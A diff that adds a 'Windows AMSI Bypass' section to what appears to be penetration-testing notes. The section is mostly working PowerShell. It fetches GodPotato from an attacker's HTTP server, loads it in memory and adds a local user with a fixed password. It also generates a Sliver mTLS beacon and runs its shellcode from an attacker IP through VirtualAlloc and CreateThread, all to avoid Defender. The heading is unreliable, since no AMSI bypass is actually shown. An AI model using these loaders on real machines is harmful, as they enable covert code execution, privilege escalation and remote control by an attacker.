@@ -192,6 +192,44 @@ moment you add it**: it is a change to the client's estate, it belongs in the
 cleanup appendix of your report, and it comes out with `netsh interface
 portproxy reset`.
 
+### Windows AMSI Bypass
+
+To execute sharptools on a compromised windows session when defender was enabled you can try loading the assembly file into the powershell memory and execute it without the file ever touching the local file system and get blocked by windows defender.
+
+For example to execute the `GodPotato` on the remote windows machine, start a http server on your machine and execute as following in a powershell session
+
+```powershell reflective loading
+$bytes = (Invoke-WebRequest -Uri "http://<your-ip>:<port>/GodPotato-Net35.exe" -UseBasicParsing).Content
+
+$asm = [System.Reflection.Assembly]::Load($bytes)
+
+$asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd', 'net user jellibean P@ssw0rd123! /add')))
+
+```
+
+The same way to get a sliver beacon from the windows machine, first generate a beacon in a shellcode format as
+
+```sliver shell
+generate beacon --mtls <redirector>:<port> --format shellcode --os windows --save <output_name>
+```
+
+And then reflectively load the shellcode as the following in a powershell session on the remote host
+
+```powershell reflective loading
+$bytes = (Invoke-WebRequest -Uri "http://<attacker-ip>:<port>/shelcode" -UseBasicParsing).Content
+
+[Byte[]]$buf = $bytes
+
+$k = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);' -Name K -Namespace W -PassThru
+
+$m = $k::VirtualAlloc(0,$buf.Length,0x3000,0x40)
+
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $m, $buf.Length)
+
+$k::CreateThread(0,0,$m,0,0,0)
+
+```
+
 ### Kerberos caveats
 
 This is the section I wish I had written for myself before starting.
